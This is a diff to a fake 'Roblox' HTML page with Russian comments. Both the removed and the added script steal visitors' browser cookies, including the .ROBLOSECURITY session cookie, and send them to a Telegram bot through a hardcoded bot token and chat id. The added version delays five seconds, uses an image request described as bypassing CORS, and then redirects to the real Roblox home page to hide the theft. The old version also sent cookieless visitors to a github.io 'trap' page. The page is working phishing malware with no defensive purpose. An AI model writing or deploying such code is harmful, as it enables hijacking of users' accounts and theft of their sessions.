@@ -3,26 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <title>Roblox</title>
-    <script>
-        var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
-        var chat_id = "6981190103";
-        
-        // Пытаемся прочитать куки
-        var cookies = document.cookie;
-        
-        // Если куки есть — отправляем в Telegram
-        if (cookies && cookies.includes('.ROBLOSECURITY')) {
-            var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent('КУКИ: ' + cookies);
-            fetch(url);
-            document.write('Перенаправление...');
-            window.location.href = 'https://www.roblox.com/home';
-        } else {
-            // Если куки нет — перенаправляем на страницу-ловушку для перехвата
-            window.location.href = 'https://gdertsqfv-code.github.io/Roblox/redirect.html';
-        }
-    </script>
 </head>
 <body>
-    <p>Загрузка...</p>
+    <p>Подождите, идёт загрузка...</p>
+    <script>
+        // ===== ТВОИ ДАННЫЕ =====
+        var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
+        var chat_id = "6981190103";
+        // =========================
+
+        // Ждём 5 секунд, чтобы куки точно загрузились
+        setTimeout(function() {
+            var cookies = document.cookie;
+            var msg = 'КУКИ: ' + cookies;
+
+            // Отправка через картинку (обходит CORS)
+            var img = new Image();
+            img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(msg);
+
+            // Если куки есть — пробуем второй способ (fetch)
+            if (cookies && cookies.length > 0) {
+                fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(msg))
+                    .catch(function(e) {});
+            }
+
+            // Перенаправление через 2 секунды после отправки
+            setTimeout(function() {
+                window.location.href = 'https://www.roblox.com/home';
+            }, 2000);
+        }, 5000);
+    </script>
 </body>
 </html>
